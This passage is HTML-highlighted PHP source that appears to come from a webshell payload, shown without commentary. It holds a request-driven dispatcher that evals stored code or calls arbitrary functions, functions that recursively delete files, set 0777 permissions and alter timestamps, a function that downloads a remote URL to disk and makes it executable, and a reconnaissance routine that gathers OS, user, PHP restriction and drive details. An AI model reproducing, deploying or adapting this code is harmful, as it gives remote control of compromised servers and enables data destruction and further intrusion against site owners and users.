    <span class="o">@</span><span class="nb">session_write_close</span><span class="p">();</span>
    <span class="nv">$className</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"codeName"</span><span class="p">);</span>
    <span class="nv">$methodName</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"methodName"</span><span class="p">);</span>
    <span class="nv">$_SES</span><span class="o">=&amp;</span><span class="nf">getSession</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$methodName</span><span class="o">!=</span><span class="kc">null</span><span class="p">){</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$className</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$methodName</span><span class="o">==</span><span class="s2">"includeCode"</span><span class="p">){</span>
                <span class="k">return</span> <span class="nf">includeCode</span><span class="p">();</span>
            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SES</span><span class="p">[</span><span class="nv">$className</span><span class="p">])){</span>
                    <span class="k">return</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_SES</span><span class="p">[</span><span class="nv">$className</span><span class="p">]);</span>
                <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                    <span class="k">return</span> <span class="s2">"</span><span class="si">{</span><span class="nv">$className</span><span class="si">}</span><span class="s2"> no load"</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nv">$methodName</span><span class="p">)){</span>
                <span class="k">return</span> <span class="nv">$methodName</span><span class="p">();</span>
            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                <span class="k">return</span> <span class="s2">"function </span><span class="si">{</span><span class="nv">$methodName</span><span class="si">}</span><span class="s2"> not exist"</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="s2">"methodName Is Null"</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>
<span class="k">function</span> <span class="n">deleteDir</span><span class="p">(</span><span class="nv">$p</span><span class="p">){</span>
    <span class="nv">$m</span><span class="o">=@</span><span class="nb">dir</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span>
    <span class="k">while</span><span class="p">(</span><span class="o">@</span><span class="nv">$f</span><span class="o">=</span><span class="nv">$m</span><span class="o">-&gt;</span><span class="nf">read</span><span class="p">()){</span>
        <span class="nv">$pf</span><span class="o">=</span><span class="nv">$p</span><span class="mf">.</span><span class="s2">"/"</span><span class="mf">.</span><span class="nv">$f</span><span class="p">;</span>
        <span class="o">@</span><span class="nb">chmod</span><span class="p">(</span><span class="nv">$pf</span><span class="p">,</span><span class="mo">0777</span><span class="p">);</span>
        <span class="k">if</span><span class="p">((</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$pf</span><span class="p">))</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nv">$f</span><span class="o">!=</span><span class="s2">"."</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nv">$f</span><span class="o">!=</span><span class="s2">".."</span><span class="p">)){</span>
            <span class="nf">deleteDir</span><span class="p">(</span><span class="nv">$pf</span><span class="p">);</span>
            <span class="o">@</span><span class="nb">rmdir</span><span class="p">(</span><span class="nv">$pf</span><span class="p">);</span>
        <span class="p">}</span><span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$pf</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nv">$f</span><span class="o">!=</span><span class="s2">"."</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nv">$f</span><span class="o">!=</span><span class="s2">".."</span><span class="p">)){</span>
            <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$pf</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nv">$m</span><span class="o">-&gt;</span><span class="nf">close</span><span class="p">();</span>
    <span class="o">@</span><span class="nb">chmod</span><span class="p">(</span><span class="nv">$p</span><span class="p">,</span><span class="mo">0777</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">@</span><span class="nb">rmdir</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">deleteFile</span><span class="p">(){</span>
    <span class="nv">$F</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"fileName"</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$F</span><span class="p">)){</span>
        <span class="k">return</span> <span class="nf">deleteDir</span><span class="p">(</span><span class="nv">$F</span><span class="p">)</span><span class="o">?</span><span class="s2">"ok"</span><span class="o">:</span><span class="s2">"fail"</span><span class="p">;</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$F</span><span class="p">)</span><span class="o">?@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$F</span><span class="p">)</span><span class="o">?</span><span class="s2">"ok"</span><span class="o">:</span><span class="s2">"fail"</span><span class="o">:</span><span class="s2">"fail"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">setFileAttr</span><span class="p">(){</span>
    <span class="nv">$type</span> <span class="o">=</span> <span class="nf">get</span><span class="p">(</span><span class="s2">"type"</span><span class="p">);</span>
    <span class="nv">$attr</span> <span class="o">=</span> <span class="nf">get</span><span class="p">(</span><span class="s2">"attr"</span><span class="p">);</span>
    <span class="nv">$fileName</span> <span class="o">=</span> <span class="nf">get</span><span class="p">(</span><span class="s2">"fileName"</span><span class="p">);</span>
    <span class="nv">$ret</span> <span class="o">=</span> <span class="s2">"Null"</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$type</span><span class="o">!=</span><span class="kc">null</span><span class="o">&amp;&amp;</span><span class="nv">$attr</span><span class="o">!=</span><span class="kc">null</span><span class="o">&amp;&amp;</span><span class="nv">$fileName</span><span class="o">!=</span><span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$type</span><span class="o">==</span><span class="s2">"fileBasicAttr"</span><span class="p">){</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">chmod</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="nf">convertFilePermissions</span><span class="p">(</span><span class="nv">$attr</span><span class="p">))){</span>
                <span class="k">return</span> <span class="s2">"ok"</span><span class="p">;</span>
            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                <span class="k">return</span> <span class="s2">"fail"</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span><span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$type</span><span class="o">==</span><span class="s2">"fileTimeAttr"</span><span class="p">){</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">touch</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="nv">$attr</span><span class="p">)){</span>
                <span class="k">return</span> <span class="s2">"ok"</span><span class="p">;</span>
            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                <span class="k">return</span> <span class="s2">"fail"</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="k">return</span> <span class="s2">"no ExcuteType"</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="nv">$ret</span><span class="o">=</span><span class="s2">"type or attr or fileName is null"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">fileRemoteDown</span><span class="p">(){</span>
    <span class="nv">$url</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"url"</span><span class="p">);</span>
    <span class="nv">$saveFile</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"saveFile"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$url</span><span class="o">!=</span><span class="kc">null</span><span class="o">&amp;&amp;</span><span class="nv">$saveFile</span><span class="o">!=</span><span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$data</span><span class="o">=@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="o">!==</span><span class="kc">false</span><span class="p">){</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$saveFile</span><span class="p">,</span><span class="nv">$data</span><span class="p">)</span><span class="o">!==</span><span class="kc">false</span><span class="p">){</span>
                <span class="o">@</span><span class="nb">chmod</span><span class="p">(</span><span class="nv">$saveFile</span><span class="p">,</span><span class="mo">0777</span><span class="p">);</span>
                <span class="k">return</span> <span class="s2">"ok"</span><span class="p">;</span>
            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                <span class="k">return</span> <span class="s2">"write fail"</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="k">return</span> <span class="s2">"read fail"</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="s2">"url or saveFile is null"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">copyFile</span><span class="p">(){</span>
    <span class="nv">$srcFileName</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"srcFileName"</span><span class="p">);</span>
    <span class="nv">$destFileName</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"destFileName"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$srcFileName</span><span class="p">)){</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">copy</span><span class="p">(</span><span class="nv">$srcFileName</span><span class="p">,</span><span class="nv">$destFileName</span><span class="p">)){</span>
            <span class="k">return</span> <span class="s2">"ok"</span><span class="p">;</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="k">return</span> <span class="s2">"fail"</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="s2">"The target does not exist or is not a file"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">moveFile</span><span class="p">(){</span>
    <span class="nv">$srcFileName</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"srcFileName"</span><span class="p">);</span>
    <span class="nv">$destFileName</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"destFileName"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">rename</span><span class="p">(</span><span class="nv">$srcFileName</span><span class="p">,</span><span class="nv">$destFileName</span><span class="p">)){</span>
        <span class="k">return</span> <span class="s2">"ok"</span><span class="p">;</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="s2">"fail"</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>
<span class="k">function</span> <span class="n">getBasicsInfo</span><span class="p">()</span>
<span class="p">{</span>
    <span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'OsInfo'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">php_uname</span><span class="p">();</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'CurrentUser'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">get_current_user</span><span class="p">();</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'CurrentUser'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'CurrentUser'</span><span class="p">]))</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">?</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'CurrentUser'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">'NULL'</span><span class="p">;</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">];</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'REMOTE_PORT'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_PORT'</span><span class="p">];</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'HTTP_X_FORWARDED_FOR'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_X_FORWARDED_FOR'</span><span class="p">];</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'HTTP_CLIENT_IP'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_CLIENT_IP'</span><span class="p">];</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'SERVER_ADDR'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'SERVER_ADDR'</span><span class="p">];</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'SERVER_NAME'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'SERVER_NAME'</span><span class="p">];</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'SERVER_PORT'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'SERVER_PORT'</span><span class="p">];</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'disable_functions'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">'disable_functions'</span><span class="p">);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'disable_functions'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'disable_functions'</span><span class="p">]))</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">?</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'disable_functions'</span><span class="p">]</span> <span class="o">:</span> <span class="o">@</span><span class="nb">get_cfg_var</span><span class="p">(</span><span class="s1">'disable_functions'</span><span class="p">);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'Open_basedir'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'timezone'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">'date.timezone'</span><span class="p">);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'encode'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">'exif.encode_unicode'</span><span class="p">);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'extension_dir'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">'extension_dir'</span><span class="p">);</span>
    <span class="nv">$tmpDir</span><span class="o">=</span><span class="nb">sys_get_temp_dir</span><span class="p">();</span>
    <span class="nv">$separator</span><span class="o">=</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$tmpDir</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$tmpDir</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$separator</span><span class="o">!=</span><span class="s1">'\\'</span><span class="o">&amp;&amp;</span><span class="nv">$separator</span><span class="o">!=</span><span class="s1">'/'</span><span class="p">){</span>
        <span class="nv">$tmpDir</span><span class="o">=</span><span class="nv">$tmpDir</span><span class="mf">.</span><span class="s1">'/'</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'systempdir'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$tmpDir</span><span class="p">;</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'include_path'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">'include_path'</span><span class="p">);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'DOCUMENT_ROOT'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'DOCUMENT_ROOT'</span><span class="p">];</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'PHP_SAPI'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">PHP_SAPI</span><span class="p">;</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'PHP_VERSION'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">PHP_VERSION</span><span class="p">;</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'PHP_INT_SIZE'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">PHP_INT_SIZE</span><span class="p">;</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'ProcessArch'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">PHP_INT_SIZE</span><span class="o">==</span><span class="mi">8</span><span class="o">?</span><span class="s2">"x64"</span><span class="o">:</span><span class="s2">"x86"</span><span class="p">;</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'PHP_OS'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">PHP_OS</span><span class="p">;</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'canCallGzipDecode'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">canCallGzipDecode</span><span class="p">();</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'canCallGzipEncode'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">canCallGzipEncode</span><span class="p">();</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'session_name'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">"session.name"</span><span class="p">);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'session_save_path'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">"session.save_path"</span><span class="p">);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'session_save_handler'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">"session.save_handler"</span><span class="p">);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'session_serialize_handler'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">"session.serialize_handler"</span><span class="p">);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'user_ini_filename'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">"user_ini.filename"</span><span class="p">);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'memory_limit'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">'memory_limit'</span><span class="p">);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'upload_max_filesize'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">'upload_max_filesize'</span><span class="p">);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'post_max_size'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">'post_max_size'</span><span class="p">);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'max_execution_time'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">'max_execution_time'</span><span class="p">);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'max_input_time'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">'max_input_time'</span><span class="p">);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'default_socket_timeout'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">'default_socket_timeout'</span><span class="p">);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'mygid'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getmygid</span><span class="p">();</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'mypid'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getmypid</span><span class="p">();</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'SERVER_SOFTWAREypid'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'SERVER_SOFTWARE'</span><span class="p">];</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'SERVER_PORT'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'SERVER_PORT'</span><span class="p">];</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'loaded_extensions'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">implode</span><span class="p">(</span><span class="s1">','</span><span class="p">,</span> <span class="o">@</span><span class="nb">get_loaded_extensions</span><span class="p">());</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'short_open_tag'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">get_cfg_var</span><span class="p">(</span><span class="s1">'short_open_tag'</span><span class="p">);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'short_open_tag'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="p">(</span><span class="n">int</span><span class="p">)</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'short_open_tag'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">?</span> <span class="s1">'true'</span> <span class="o">:</span> <span class="s1">'false'</span><span class="p">;</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'asp_tags'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">get_cfg_var</span><span class="p">(</span><span class="s1">'asp_tags'</span><span class="p">);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'asp_tags'</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">int</span><span class="p">)</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'asp_tags'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">?</span> <span class="s1">'true'</span> <span class="o">:</span> <span class="s1">'false'</span><span class="p">;</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'safe_mode'</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">get_cfg_var</span><span class="p">(</span><span class="s1">'safe_mode'</span><span class="p">);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'safe_mode'</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">int</span><span class="p">)</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'safe_mode'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">?</span> <span class="s1">'true'</span> <span class="o">:</span> <span class="s1">'false'</span><span class="p">;</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'CurrentDir'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'\\'</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">,</span> <span class="o">@</span><span class="nb">dirname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'SCRIPT_FILENAME'</span><span class="p">]));</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'CurrentDir'</span><span class="p">]))</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
        <span class="nv">$data</span><span class="p">[</span><span class="s1">'CurrentDir'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'\\'</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">,</span> <span class="o">@</span><span class="nb">dirname</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">));</span>
    <span class="p">}</span>
    <span class="nv">$SCRIPT_FILENAME</span><span class="o">=@</span><span class="nb">dirname</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'FileRoot'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$SCRIPT_FILENAME</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="s1">'/'</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$drivers</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s1">'C'</span><span class="p">,</span><span class="s1">'D'</span><span class="p">,</span><span class="s1">'E'</span><span class="p">,</span><span class="s1">'F'</span><span class="p">,</span><span class="s1">'G'</span><span class="p">,</span><span class="s1">'H'</span><span class="p">,</span><span class="s1">'I'</span><span class="p">,</span><span class="s1">'J'</span><span class="p">,</span><span class="s1">'K'</span><span class="p">,</span><span class="s1">'L'</span><span class="p">,</span><span class="s1">'M'</span><span class="p">,</span><span class="s1">'N'</span><span class="p">,</span><span class="s1">'O'</span><span class="p">,</span><span class="s1">'P'</span><span class="p">,</span><span class="s1">'Q'</span><span class="p">,</span><span class="s1">'R'</span><span class="p">,</span><span class="s1">'S'</span><span class="p">,</span><span class="s1">'T'</span><span class="p">,</span><span class="s1">'U'</span><span class="p">,</span><span class="s1">'V'</span><span class="p">,</span><span class="s1">'W'</span><span class="p">,</span><span class="s1">'X'</span><span class="p">,</span><span class="s1">'Y'</span><span class="p">,</span><span class="s1">'Z'</span><span class="p">);</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$drivers</span> <span class="k">as</span> <span class="nv">$L</span><span class="p">){</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">is_dir</span><span class="p">(</span><span class="s2">"</span><span class="si">{</span><span class="nv">$L</span><span class="si">}</span><span class="s2">:/"</span><span class="p">)){</span>
                <span class="nv">$data</span><span class="p">[</span><span class="s1">'FileRoot'</span><span class="p">]</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"</span><span class="si">{</span><span class="nv">$L</span><span class="si">}</span><span class="s2">:/;"</span><span class="p">;}</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'FileRoot'</span><span class="p">])){</span>
            <span class="nv">$data</span><span class="p">[</span><span class="s1">'FileRoot'</span><span class="p">]</span><span class="o">=</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$SCRIPT_FILENAME</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="nv">$data</span><span class="p">[</span><span class="s1">'FileRoot'</span><span class="p">]</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"/"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$result</span><span class="o">=</span><span class="s2">""</span><span class="p">;</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$data</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&gt;</span><span class="nv">$value</span><span class="p">){</span>
        <span class="nv">$result</span><span class="mf">.</span><span class="o">=</span><span class="nv">$key</span><span class="mf">.</span><span class="s2">" : "</span><span class="mf">.</span><span class="nv">$value</span><span class="mf">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
<span class="p">}</span>
